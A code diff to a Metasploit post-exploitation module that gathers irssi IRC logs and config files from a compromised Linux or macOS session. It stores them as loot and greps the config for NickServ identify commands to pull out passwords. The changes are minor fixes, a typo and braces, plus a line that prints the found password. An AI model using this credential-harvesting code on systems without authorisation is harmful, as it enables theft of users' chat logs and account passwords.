@@ -24,14 +24,14 @@ class Metasploit3 < Msf::Post
 			'License'       => MSF_LICENSE,
 			'Author'        => [ 'HenryHoggard'],
 			'Platform'      => [ 'linux', 'osx', 'unix'],
-			'SessionTypes'  => [ "shell" ],
+			'SessionTypes'  => [ "shell" ]
 			
 		))
 
 	end
 
   def run
-      print_status "Attempting to enumrate logs..."
+      print_status "Attempting to enumerate logs..."
       @peer = "#{session.session_host}:#{session.session_port}"
       user = session.shell_command("whoami").chomp
       
@@ -68,7 +68,6 @@ class Metasploit3 < Msf::Post
       print_good("#{@peer} - #{name} saved as #{loot}")
 			
     end
-    return irc_logs
   end
     
   def get_config(path)
@@ -78,13 +77,14 @@ class Metasploit3 < Msf::Post
     loot = store_loot('IRSSI_CONFIG', 'text/plain', session, content, "#{@peer}_config", "IRSSI Config file")
     print_good("#{@peer} - Config saved as #{loot}")
     password = cmd_exec('cat #{path} | grep "autosendcmd = \"/msg nickserv identify"')
-    
+    print_status("#{password}")
     if password.to_s != ''
       print_good("#{@peer} - Possible passwords found! /n #{password}")
     end
 
 	
 
-end
+  end
     
+end
     
